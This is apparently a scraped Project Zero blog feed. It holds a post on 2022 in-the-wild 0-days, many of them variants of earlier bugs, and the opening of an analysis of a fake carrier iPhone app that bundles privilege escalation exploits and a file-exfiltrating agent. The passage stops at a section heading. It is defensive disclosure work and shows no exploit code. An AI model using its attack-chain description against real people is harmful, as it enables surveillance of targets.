 <p class="HZWKYxoXby-c6"><span class="HZWKYxoXby-c10">This blog post is an overview of a talk, &ldquo; 0-day In-the-Wild Exploitation in 2022&hellip;so far&rdquo;, </span><span class="HZWKYxoXby-c10">that I gave</span><span class="HZWKYxoXby-c10">&nbsp;at the FIRST conference in June 2022. The slides are available </span><span class="HZWKYxoXby-c1 HZWKYxoXby-c10"><a class="HZWKYxoXby-c81" href="https://github.com/maddiestone/ConPresentations/blob/master/FIRST2022.2022_0days_so_far.pdf">here</a></span><span class="HZWKYxoXby-c12 HZWKYxoXby-c10">.</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c12 HZWKYxoXby-c10"></span></p>
 <p class="HZWKYxoXby-c6"><span>For the last three years, we&rsquo;ve published annual year-in-review reports of 0-days found exploited in the wild. The most recent of these reports is the </span><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html">2021 Year in Review report</a></span><span class="HZWKYxoXby-c5">, which we published just a few months ago in April. While we plan to stick with that annual cadence, we&rsquo;re publishing a little bonus report today looking at the in-the-wild 0-days detected and disclosed in the first half of 2022.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
 <p class="HZWKYxoXby-c6"><span>As of June 15, 2022, there have been 18 0-days detected and disclosed </span><span>as exploited in-the-wild in 2022</span><span class="HZWKYxoXby-c5">. When we analyzed those 0-days, we found that at least nine of the 0-days are variants of previously patched vulnerabilities. At least half of the 0-days we&rsquo;ve seen in the first six months of 2022 could have been prevented with more comprehensive patching and regression tests. On top of that, four of the 2022 0-days are variants of 2021 in-the-wild 0-days. Just 12 months from the original in-the-wild 0-day being patched, attackers came back with a variant of the original bug. &nbsp;</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p><a id="t.4fab798cceb7e37dcf71e15c259bff9761363678"></a><a id="t.0"></a><table class="HZWKYxoXby-c17"><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c15">Product</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c15">2022 ITW 0-day</span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c15">Variant</span></p></td></tr><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c5">Windows win32k</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-21882.html">CVE-2022-21882</a></span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html">CVE-2021-1732</a></span><span class="HZWKYxoXby-c5">&nbsp;(2021 itw)</span></p></td></tr><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c5">iOS IOMobileFrameBuffer</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://support.apple.com/en-us/HT213053">CVE-2022-22587</a></span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html">CVE-2021-30983</a></span><span class="HZWKYxoXby-c5">&nbsp;(2021 itw)</span></p></td></tr><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c5">Windows</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190">CVE-2022-30190</a></span><span class="HZWKYxoXby-c5">&nbsp;(&ldquo;Follina&rdquo;)</span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444">CVE-2021-40444</a></span><span class="HZWKYxoXby-c5">&nbsp;(2021 itw)</span></p></td></tr><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c5">Chromium property access interceptors</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_25.html">CVE-2022-1096</a></span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://bugs.chromium.org/p/chromium/issues/detail?id=619166">CVE-2016-5128</a></span><span>&nbsp;</span><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30551.html">CVE-2021-30551</a></span><span>&nbsp;(2021 itw) </span><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2280">CVE-2022-1232</a></span><span class="HZWKYxoXby-c5">&nbsp;(Addresses incomplete CVE-2022-1096 fix)</span></p></td></tr><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c5">Chromium v8</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://chromereleases.googleblog.com/2022/04/stable-channel-update-for-desktop_14.html">CVE-2022-1364</a></span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://chromereleases.googleblog.com/2021/03/stable-channel-update-for-desktop_30.html">CVE-2021-21195</a></span></p></td></tr><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c5">WebKit</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22620.html">CVE-2022-22620</a></span><span class="HZWKYxoXby-c5">&nbsp;(&ldquo;Zombie&rdquo;)</span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://googleprojectzero.blogspot.com/2022/06/an-autopsy-on-zombie-in-wild-0-day.html">Bug was originally fixed in 2013, patch was regressed in 2016</a></span></p></td></tr><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c5">Google Pixel</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://source.android.com/security/bulletin/pixel/2022-03-01">CVE-2021-39793</a></span><span class="HZWKYxoXby-c5">*</span></p>
 <p class="HZWKYxoXby-c0 HZWKYxoXby-c11"><span class="HZWKYxoXby-c19"></span></p>
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c19">* While this CVE says 2021, the bug was patched and disclosed in 2022</span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cd5297b0855f17c8b4e3ef1d20c6a3656209c7b3">Linux same bug in a different subsystem</a></span></p></td></tr><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c5">Atlassian Confluence</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">CVE-2022-26134</a></span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html">CVE-2021-26084</a></span></p></td></tr><tr class="HZWKYxoXby-c7"><td class="HZWKYxoXby-c9" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c5">Windows</span></p></td><td class="HZWKYxoXby-c2" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26925">CVE-2022-26925</a></span><span class="HZWKYxoXby-c5">&nbsp;(&ldquo;PetitPotam&rdquo;)</span></p></td><td class="HZWKYxoXby-c3" colspan="1" rowspan="1">
 <p class="HZWKYxoXby-c0"><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942">CVE-2021-36942</a></span><span class="HZWKYxoXby-c5">&nbsp;(Patch regressed)</span></p></td></tr></table>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
 <p class="HZWKYxoXby-c6"><span class="HZWKYxoXby-c21">So, what does this mean?</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
 <p class="HZWKYxoXby-c6"><span>When people think of 0-day exploits, they often think that these exploits are so technologically advanced that there&rsquo;s no hope to catch and prevent them. The data paints a different picture. At least half of the 0-days we&rsquo;ve seen so far this year are closely related to bugs we&rsquo;ve seen before. Our conclusion and findings in the </span><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html">2020 year-in-review report</a></span><span class="HZWKYxoXby-c5">&nbsp;were very similar.</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
 <p class="HZWKYxoXby-c6"><span>Many of the 2022 in-the-wild 0-days are due to the previous vulnerability not being fully patched. In the case of the Windows win32k and the Chromium property access interceptor bugs, the execution flow that the proof-of-concept exploits took were patched, but the root cause issue was not addressed: attackers were able to come back and trigger the original vulnerability through a different path. And in the case of the WebKit and Windows PetitPotam issues, the original vulnerability had previously been patched, but at some point regressed so that attackers could exploit the same vulnerability again. In the iOS IOMobileFrameBuffer bug, a buffer overflow was addressed by checking that a size was less than a certain number, but it didn&rsquo;t check a minimum bound on that size. For more detailed explanations of three of the 0-days and how they relate to their variants, please see the </span><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://github.com/maddiestone/ConPresentations/blob/master/FIRST2022.2022_0days_so_far.pdf">slides from the talk</a></span><span class="HZWKYxoXby-c5">.</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
 <p class="HZWKYxoXby-c6"><span class="HZWKYxoXby-c5">When 0-day exploits are detected in-the-wild, it&rsquo;s the failure case for an attacker. It&rsquo;s a gift for us security defenders to learn as much as we can and take actions to ensure that that vector can&rsquo;t be used again. The goal is to force attackers to start from scratch each time we detect one of their exploits: they&rsquo;re forced to discover a whole new vulnerability, they have to invest the time in learning and analyzing a new attack surface, they must develop a brand new exploitation method. To do that effectively, we need correct and comprehensive fixes.</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
 <p class="HZWKYxoXby-c6"><span class="HZWKYxoXby-c5">This is not to minimize the challenges faced by security teams responsible for responding to vulnerability reports. As we said in our 2020 year in review report: </span></p>
 <p class="HZWKYxoXby-c6 HZWKYxoXby-c20"><span class="HZWKYxoXby-c12 HZWKYxoXby-c10">Being able to correctly and comprehensively patch isn&#39;t just flicking a switch: it requires investment, prioritization, and planning. It also requires developing a patching process that balances both protecting users quickly and ensuring it is comprehensive, which can at times be in tension. While we expect that none of this will come as a surprise to security teams in an organization, this analysis is a good reminder that there is still more work to be done. </span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c12 HZWKYxoXby-c10"></span></p>
 <p class="HZWKYxoXby-c6 HZWKYxoXby-c20"><span class="HZWKYxoXby-c10 HZWKYxoXby-c12">Exactly what investments are likely required depends on each unique situation, but we see some common themes around staffing/resourcing, incentive structures, process maturity, automation/testing, release cadence, and partnerships.</span></p>
 <p class="HZWKYxoXby-c6"><span class="HZWKYxoXby-c5">&nbsp;</span></p>
 <p class="HZWKYxoXby-c6"><span>Practically, </span><span>some of the</span><span class="HZWKYxoXby-c5">&nbsp;following efforts can help ensure bugs are correctly and comprehensively fixed. Project Zero plans to continue to help with the following efforts, but we hope and encourage platform security teams and other independent security researchers to invest in these types of analyses as well:</span></p><ul style="padding: 0;" class="c13 lst-kix_68660h7uawx-0 start"><li style="margin-left: 46pt;" class="c6 c18 li-bullet-0"><span class="HZWKYxoXby-c5">Root cause analysis</span></li></ul>
 <p class="HZWKYxoXby-c6 HZWKYxoXby-c16"><span class="HZWKYxoXby-c5">Understanding the underlying vulnerability that is being exploited. Also tries to understand how that vulnerability may have been introduced. Performing a root cause analysis can help ensure that a fix is addressing the underlying vulnerability and not just breaking the proof-of-concept. Root cause analysis is generally a pre-requisite for successful variant and patch analysis.</span></p><ul style="padding: 0;" class="c13 lst-kix_68660h7uawx-0"><li style="margin-left: 46pt;" class="c6 c18 li-bullet-0"><span class="HZWKYxoXby-c5">Variant analysis</span></li></ul>
 <p class="HZWKYxoXby-c6 HZWKYxoXby-c16"><span class="HZWKYxoXby-c5">Looking for other vulnerabilities similar to the reported vulnerability. This can involve looking for the same bug pattern elsewhere, more thoroughly auditing the component that contained the vulnerability, modifying fuzzers to understand why they didn&rsquo;t find the vulnerability previously, etc. Most researchers find more than one vulnerability at the same time. By finding and fixing the related variants, attackers are not able to simply &ldquo;plug and play&rdquo; with a new vulnerability once the original is patched.</span></p><ul style="padding: 0;" class="c13 lst-kix_68660h7uawx-0"><li style="margin-left: 46pt;" class="c6 c18 li-bullet-0"><span class="HZWKYxoXby-c5">Patch analysis</span></li></ul>
 <p class="HZWKYxoXby-c6 HZWKYxoXby-c16"><span class="HZWKYxoXby-c5">Analyzing the proposed (or released) patch for completeness compared to the root cause vulnerability. I encourage vendors to share how they plan to address the vulnerability with the vulnerability reporter early so the reporter can analyze whether the patch comprehensively addresses the root cause of the vulnerability, alongside the vendor&rsquo;s own internal analysis.</span></p><ul style="padding: 0;" class="c13 lst-kix_68660h7uawx-0"><li style="margin-left: 46pt;" class="c6 c18 li-bullet-0"><span class="HZWKYxoXby-c5">Exploit technique analysis</span></li></ul>
 <p class="HZWKYxoXby-c6 HZWKYxoXby-c16"><span>Understanding the primitive gained from the vulnerability and how it&rsquo;s being used. While it&rsquo;s generally industry-standard to patch vulnerabilities, mitigating exploit techniques doesn&rsquo;t happen as frequently. While not every exploit technique will always be able to be mitigated, the hope is that it will become the default rather than the exception. Exploit samples will need to be shared more readily in order for vendors and security researchers to be able to perform exploit technique analysis.</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
 <p class="HZWKYxoXby-c6"><span>Transparently sharing these analyses helps the industry as a whole as well. We publish our analyses at </span><span class="HZWKYxoXby-c1"><a class="HZWKYxoXby-c81" href="https://googleprojectzero.github.io/0days-in-the-wild/rca.html">this repository</a></span><span class="HZWKYxoXby-c5">. We encourage vendors and others to publish theirs as well. This allows developers and security professionals to better understand what the attackers already know about these bugs, which hopefully leads to even better solutions and security overall. &nbsp;</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/256978548158816980/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/256978548158816980
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/256978548158816980
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html
## @title
2022 0-day In-the-Wild Exploitationso far
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-5973748726134682294
## published
23/06/2022 13:01:00
## updated
24/08/2022 15:58:33
## title
## @type
text
## #text
The curious tale of a fake Carrier.app
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=cGvuclDC_Z1vE_cnVEU6Ae_NZQ7StBcqH_vXVqoPMX0');ol{margin:0;padding:0}table td,table th{padding:0}.HovzfPYjjR-c13{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.HovzfPYjjR-c34{padding-top:0pt;padding-bottom:3pt;line-height:1.5;page-break-after:avoid;text-align:left}.HovzfPYjjR-c15{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.HovzfPYjjR-c17{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.HovzfPYjjR-c31{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.HovzfPYjjR-c6{color:#000000;font-weight:400;font-size:11pt;font-family:"Courier New"}.HovzfPYjjR-c9{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.HovzfPYjjR-c0{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.HovzfPYjjR-c30{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.HovzfPYjjR-c20{border-spacing:0;border-collapse:collapse;margin-right:auto}.HovzfPYjjR-c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.HovzfPYjjR-c14{font-size:10pt;font-family:Consolas,"Courier New";color:#3367d6;font-weight:400}.HovzfPYjjR-c16{color:#000000;font-weight:400;font-size:16pt;font-family:"Arial"}.HovzfPYjjR-c5{color:#000000;font-weight:400;font-size:11pt;font-family:"Arial"}.HovzfPYjjR-c27{color:#000000;font-weight:700;font-size:11pt;font-family:"Arial"}.HovzfPYjjR-c23{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:700}.HovzfPYjjR-c22{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.HovzfPYjjR-c1{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.HovzfPYjjR-c4{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.HovzfPYjjR-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.HovzfPYjjR-c21{color:#000000;font-weight:400;font-size:26pt;font-family:"Arial"}.HovzfPYjjR-c2{text-decoration:none;vertical-align:baseline;font-style:normal}.HovzfPYjjR-c33{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.HovzfPYjjR-c32{margin-left:22.5pt;text-indent:36pt}.HovzfPYjjR-c19{color:inherit;text-decoration:inherit}.HovzfPYjjR-c26{font-weight:700;font-family:"Courier New"}.HovzfPYjjR-c7{font-weight:400;font-family:"Courier New"}.HovzfPYjjR-c28{text-decoration:none;vertical-align:baseline}.HovzfPYjjR-c8{orphans:2;widows:2}.HovzfPYjjR-c29{font-weight:700}.HovzfPYjjR-c18{height:0pt}.HovzfPYjjR-c25{font-style:italic}.HovzfPYjjR-c11{background-color:#00ff00}.HovzfPYjjR-c12{margin-right:-45pt}.HovzfPYjjR-c10{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style><body class="HovzfPYjjR-c33">
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Posted by Ian Beer, Google Project Zero</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c29">NOTE: This issue was CVE-2021-30983 was fixed in iOS 15.2 in December 2021.</span><span class="HovzfPYjjR-c2 HovzfPYjjR-c27">&nbsp;</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Towards the end of 2021 Google's Threat Analysis Group (TAG) shared an iPhone app</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;with me:</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioBjlvs-GjJW9ZocxERk7cU6J-bBcWIjauCAzuI6QoMvdQENbSjF6elAZ0yUpLbHfTmOzfdKWBhB_FFR8X9UF1yMqN9XSMmJSUDZ_uVX_zctpmYMaD0G6V7bi68tdJ2C-e3eyM715_cTywzOWAgSbPyazbNtMv65p0lWewhacxCox_vrztKXdRZdjB/s1874/Screenshot%202022-06-22%20at%2016.52.33.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="App splash screen showing the Vodafone carrier logo and the text My Vodafone." border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioBjlvs-GjJW9ZocxERk7cU6J-bBcWIjauCAzuI6QoMvdQENbSjF6elAZ0yUpLbHfTmOzfdKWBhB_FFR8X9UF1yMqN9XSMmJSUDZ_uVX_zctpmYMaD0G6V7bi68tdJ2C-e3eyM715_cTywzOWAgSbPyazbNtMv65p0lWewhacxCox_vrztKXdRZdjB/s1200/Screenshot%202022-06-22%20at%2016.52.33.png" style="max-height: 750px; max-width: 600px;" title="App splash screen showing the Vodafone carrier logo and the text My Vodafone." /></a></span><img /></p>
 <p class="HovzfPYjjR-c24 HovzfPYjjR-c8"><span class="HovzfPYjjR-c25">App splash screen showing the Vodafone carrier logo and the text "</span><span class="HovzfPYjjR-c25">My Vodafone</span><span class="c5 c28 c25">" (not the legitimate Vodadone app)</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Although this looks like the real </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://apps.apple.com/gb/app/my-vodafone/id370901726">My Vodafone carrier app</a></span><span>&nbsp;available in the App Store, it didn't come from the App Store and is not the real application from Vodafone. TAG suspects that a target receives a link to this app in an SMS, after the attacker asks the carrier to disable the target's mobile data connection. The SMS claims that in order to restore mobile data connectivity, the target must install the carrier app and includes a link to download and install this fake app.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>This sideloading works because the app is signed with an enterprise certificate, which can be purchased for $299 via the Apple </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://developer.apple.com/programs/enterprise/">Enterprise developer program</a></span><span>. This program allows an eligible enterprise to obtain an Apple-signed </span><span class="HovzfPYjjR-c7">embedded.mobileprovision</span><span>&nbsp;file with the </span><span class="HovzfPYjjR-c7">ProvisionsAllDevices</span><span>&nbsp;key set. An app signed with the developer certificate embedded within that </span><span class="HovzfPYjjR-c7">mobileprovision</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;file can be sideloaded on any iPhone, bypassing Apple's App Store review process. While we understand that the Enterprise developer program is designed for companies to push "trusted apps" to their staff's iOS devices, in this case, it appears that it was being used to sideload this fake carrier app.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>In collaboration with Project Zero, </span><span><a href="https://blog.google/threat-analysis-group/italian-spyware-vendor-targets-users-in-italy-and-kazakhstan/" target="_blank">TAG has published an additional post with more details around the targeting and the actor</a></span><span>. The rest of this blogpost is dedicated to the technical analysis of the app and the exploits contained therein.</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.rengd0ayidhp"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">App structure</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The app is broken up into multiple frameworks. </span><span class="HovzfPYjjR-c7">InjectionKit.framework</span><span>&nbsp;is a generic privilege escalation exploit wrapper, exposing the primitives you'd expect (kernel memory access, entitlement injection, </span><span>amfid</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;bypasses) as well as higher-level operations like app installation, file creation and so on.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c7">Agent.framework</span><span class="HovzfPYjjR-c2 HovzfPYjjR-c5">&nbsp;is partially obfuscated but, as the name suggests, seems to be a basic agent able to find and exfiltrate interesting files from the device like the Whatsapp messages database.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Six privilege escalation exploits are bundled with this app. Five are well-known, publicly available N-day exploits for older iOS versions. The sixth is not like those others at all.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">This blog post is the story of the last exploit and the month-long journey to understand it.</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.nr1ejtuvx4nm"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">Something's missing? Or am I missing something?</span></h2>
